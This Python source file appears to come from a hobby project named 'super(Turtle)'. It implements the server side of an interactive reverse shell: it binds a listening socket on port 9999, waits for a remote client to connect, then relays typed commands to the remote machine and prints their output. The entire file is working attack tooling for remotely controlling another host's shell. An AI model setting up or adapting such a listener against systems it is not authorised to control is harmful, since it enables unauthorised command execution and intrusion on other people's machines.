#!/usr/env/bin python3

'''
super(Turtle) Server package.
Exposes TurtleServer class to handle server-side reverse shell.
'''

import socket


class TurtleServer(object):
    '''
    Socket sever.
    '''

    motd = '''
   \033[92m.-./*)
 _/___\/\033[39m   \033[1;93msuper\033[0;39m(Turtle) - interactive reverse-shell
\033[92m   U U\033[39m
'''

    def __init__(self, host, port=9999, backlog=5, bufsize=1024):
        '''
        Handle parameters and store it within instance
        '''
        self.host = host
        self.port = port
        self.backlog = backlog
        self.bufsize = bufsize


    def run(self, interactive=True):
        '''
        Run server (interactivly by default)
        '''
        self._create_socket()
        self._bind()
        self._connect()

        if interactive is True:
            self.interactive_send()



    def close(self):
        '''
        Close server and connection
        '''
        self._log('Quitting')
        self.connection.close()
        self._socket.close()


    def _create_socket(self):
        '''
        Initialize `self._socket`.
        '''
        self._socket = socket.socket()


    def _bind(self):
        '''
        Bind `self._socket` to host / port and start
        listening.
        '''
        self._log('Binding socket to port {}'.format(self.port))
        self._socket.bind((self.host, self.port))
        self._socket.listen(self.backlog)


    def _connect(self):
        '''
        Establish connection with client.
        '''
        conn, address = self._socket.accept()
        self._log('Connected, ip: {0}, port: {1}'.format(*address))
        self.connection = conn
        self._address = address

        # If somebody have better idea than this I take it
        # The goal is to send a first empty command to have response
        # with "ps1" (/path/to/dir> ) displayed at startup of connection.
        print(self.send('echo ""'), end="")


    def send(self, command):
        '''
        Send command.
        '''
        if command in ['quit', 'exit']:
            self.close()
            exit()

        if len(str.encode(command)) > 0:
            self.connection.send(str.encode(command))
            self.last_response = self.connection.recv(self.bufsize)
            return str(self.last_response, 'utf-8')


    def interactive_send(self):
        '''
        Interactivly call `self.send()`.
        '''
        while True:
            command = input()
            print(self.send(command), end="")


    def _log(self, message):
        print('\033[95m{}\033[39m'.format(message))


if __name__ == '__main__':
    ts = TurtleServer('')
    print(ts.motd)
    try:
        ts.run()
    except KeyboardInterrupt:
        ts.close()

